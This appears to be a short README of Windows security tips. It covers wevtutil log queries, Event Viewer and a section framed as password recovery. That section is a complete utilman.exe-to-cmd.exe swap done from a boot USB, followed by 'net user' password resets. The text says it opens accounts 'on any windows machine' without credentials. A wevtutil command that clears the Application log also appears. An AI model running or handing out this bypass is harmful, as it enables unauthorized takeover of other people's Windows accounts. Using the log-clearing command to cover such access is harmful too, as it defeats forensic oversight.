# security
cool tricks to securing and some how a little forensics.

<ul>
<li>Wevtutil</li>
<li>Event Viewer</li>
<li>Bypass windows Login </li>
</ul>

# Wevtutil
Enables you to retrieve information about event logs and publishers in powershell,cmd, and also git bash.

<ul>
<li>To see last 50 login in our device:

    wevtutil qe Security /c:50 /rd:true /f:text
  
<p>you should be administrator to run this command</p>
</li>
<li>Find the last 20 startup events in the System log:

    wevtutil query-events System /count:20 /rd:true /format:text /q:"Event[System[(EventID=12)]]"

</li>
<li>Display the status of the Application log:

    wevtutil gli Application

</li>
<li>Clear all the events from the Application log:

    wevtutil clear-log Application
    
</li>
<li>...</li>
</ul>

# Event Viewer
Event Viewer is a component of Microsoft's Windows operating system that lets administrators and users view the event logs on a local or remote machine.just type

    eventvwr

# Recover windows without password
as you may know you can open accounts on any windows machine without any passwords by just a windwos bootable usb.when installation go repair this pc and open command prompt and type this command.

    move c:\windows\system32\utilman.exe c:\ 

<p>c is directory that windows is installed,and maybe it is different in your pc.and then this command:</p>

    copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe


<p>after all:</p>


    wpeutil reboot

<p>after the reboot  click on ease of use,CMD will opens then type:</p>

    net user

<p>after you saw users then the user you want to login with:</p>

    net user <desired user> <your password>

<p> you are in windows now!</p>
